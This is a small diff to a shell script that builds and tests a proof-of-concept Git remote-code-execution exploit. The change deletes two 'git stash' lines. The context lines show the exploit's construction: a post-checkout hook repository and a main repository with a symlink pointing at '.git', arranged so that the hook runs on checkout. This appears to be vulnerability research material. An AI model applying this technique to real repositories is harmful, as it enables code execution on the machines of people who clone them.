@@ -74,7 +74,6 @@ fi
 "$git_editor" "$PWD/scripts/hooks/post-checkout"
 git add scripts/hooks/post-checkout ||error_handler
 git diff --cached --quiet HEAD ||git commit -m "add-post-checkout" ||error_handler
-git stash ||error_handler
 cd .. ||error_handler
 hook_repo_path="$PWD/git_rce_hook"
 echo Constructing main repo...
@@ -92,7 +91,6 @@ git update-index --add --cacheinfo 120000 $(echo -n ".git" | git hash-object -w 
 git diff --cached --quiet HEAD ||git commit -m "add-symlink" ||error_handler
 xcopy GITLNK .git //b //e //v //r //i //g //h //o //c //k //y ||error_handler
 git reset --hard HEAD ||error_handler
-git stash ||error_handler
 cd .. ||error_handler
 main_repo_path="$PWD/git_rce_main"
 echo Testing the exploit...
